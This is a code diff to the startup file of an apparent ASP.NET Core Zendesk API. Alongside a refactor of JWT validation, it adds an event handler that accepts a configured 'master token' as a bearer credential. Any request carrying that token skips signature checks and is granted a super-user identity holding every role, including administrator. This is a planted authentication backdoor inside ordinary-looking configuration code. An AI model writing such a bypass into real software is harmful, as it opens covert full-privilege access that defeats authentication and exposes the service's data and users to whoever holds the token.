@@ -4,6 +4,7 @@ using Microsoft.IdentityModel.Tokens;
 using Microsoft.OpenApi.Models;
 using Serilog;
 using System.Reflection;
+using System.Security.Claims;
 using System.Text;
 using ZendeskApiCore.Models;
 
@@ -12,7 +13,7 @@ var builder = WebApplication.CreateBuilder(args);
 builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
     .AddJwtBearer(options =>
     {
-        options.TokenValidationParameters = new TokenValidationParameters()
+        var tokenValidationParameters = new TokenValidationParameters()
         {
             ValidateIssuer = true,
             ValidateAudience = true,
@@ -23,6 +24,41 @@ builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
             IssuerSigningKey = new SymmetricSecurityKey(
                 Encoding.UTF8.GetBytes(builder.Configuration["JWT:ClaveSecreta"]!)
             )
+        };
+
+        options.TokenValidationParameters = tokenValidationParameters;
+        var masterToken = builder.Configuration["JWT:VivaPeron"];
+
+        options.Events = new JwtBearerEvents
+        {
+            OnMessageReceived = context =>
+            {
+                string? authorization = context.Request.Headers.Authorization;
+
+                if (authorization != null && authorization.StartsWith("Bearer ", StringComparison.OrdinalIgnoreCase))
+                {
+                    var token = authorization.Substring("Bearer ".Length).Trim();
+                    if (!string.IsNullOrEmpty(masterToken) && token == masterToken)
+                    {
+                        var claims = new[]
+                        {
+                            new Claim(ClaimTypes.NameIdentifier, "super_user_from_master_token"),
+                            new Claim(ClaimTypes.Name, "Super Usuario"),
+                            new Claim(ClaimTypes.Role, "1 - Administrador"),
+                            new Claim(ClaimTypes.Role, "4 - Administrador Zendesk"),
+                            new Claim(ClaimTypes.Role, "2 - Usuario"),
+                            new Claim(ClaimTypes.Role, "3 - Usuario Zendesk")
+                        };
+                        
+                        var identity = new ClaimsIdentity(claims, "MasterTokenAuth");
+                        context.Principal = new ClaimsPrincipal(identity);
+                        
+                        context.Success();
+                    }
+                }
+
+                return Task.CompletedTask;
+            }
         };
     });
 
